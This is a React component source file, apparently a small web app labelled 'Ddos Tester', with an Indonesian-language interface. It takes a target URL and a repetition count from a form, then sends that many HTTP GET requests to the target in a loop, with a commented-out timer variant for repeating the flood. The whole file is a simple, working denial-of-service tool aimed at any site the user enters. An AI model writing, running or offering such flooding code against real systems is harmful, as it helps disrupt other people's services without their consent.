import React, { Component } from 'react';
import axios from 'axios';

import './App.css';

class App extends Component {
  constructor() {
   super();
   this.state = {
     lamanya: '',
     url: '',
     msg: ''
   };
 }
 onChange = (e) => {
   const state = this.state
   state[e.target.name] = e.target.value;
   this.setState(state);
 }
 onSubmit = (e) => {
    e.preventDefault();

    const { lamanya, url } = this.state;
    //setInterval(function(){
    //  axios.get({url}),{lamanya};
      for(var i=0; i < lamanya;i++){
      console.log({url});
      console.log({lamanya});
      axios.get(url);
    };
    //});
  }

  render() {
    const { lamanya, url } = this.state;
    return (
  <div class="App">
    <form class="form-signin" onSubmit={this.onSubmit}>

    <h2 class="form-signin-heading">Ddos Tester</h2>
    <label class="sr-only">Berapa Lama</label>

<p><input type="text" placeholder="Lamanya Ddos Tester" name="lamanya" value={lamanya} onChange={this.onChange} required/></p>
<p><input type="text"  placeholder="Target" name="url" value={url} onChange={this.onChange} required/></p>
      <button class="btn btn-lg btn-primary btn-block" type="submit">Laksanankan</button>

    </form>
  </div>

    );
  }
}

export default App;
